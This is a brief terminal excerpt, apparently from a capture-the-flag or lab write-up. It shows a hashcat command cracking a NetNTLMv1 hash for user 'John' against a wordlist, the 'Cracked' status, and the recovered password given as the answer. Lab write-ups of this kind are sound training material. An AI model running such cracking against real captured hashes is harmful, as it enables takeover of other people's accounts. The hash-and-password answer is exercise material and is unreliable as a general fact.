└──╼ [★]$ hashcat -m 5500 -a 0 John::::332fd1164258ea46edb4ec223e6d3b7632cc4169a35ae8b6:efdf7be5eead3703 wordlist.txt 

hashcat (v6.2.6) starting

<SBIP>

John::::332fd1164258ea46edb4ec223e6d3b7632cc4169a35ae8b6:efdf7be5eead3703::{hidden}
                                                          
Session..........: hashcat
Status...........: Cracked
```

Answer: `John:rangers`